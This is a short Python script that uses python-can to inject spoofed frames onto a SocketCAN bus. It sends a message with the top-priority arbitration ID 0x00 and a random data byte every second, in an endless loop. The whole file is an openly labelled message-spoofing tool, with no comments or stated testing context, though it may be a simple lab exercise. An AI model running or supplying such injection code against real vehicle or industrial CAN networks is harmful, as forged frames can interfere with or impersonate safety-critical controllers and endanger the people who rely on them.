import can
import random
import time

def spoof():
	spoofed_data=random.randint(0,255)
	return spoofed_data

bus=can.interface.Bus(channel='can0',bustype='socketcan')
while True:
	spoofed_data=spoof()
	print(spoofed_data)
	data1=[0,0,0,0,0,0,0,spoofed_data]
	can_message=can.Message(arbitration_id=0x00,data=data1,is_extended_id=False)
	bus.send(can_message)
	print('Sent message with data:',can_message.data)
	time.sleep(1)

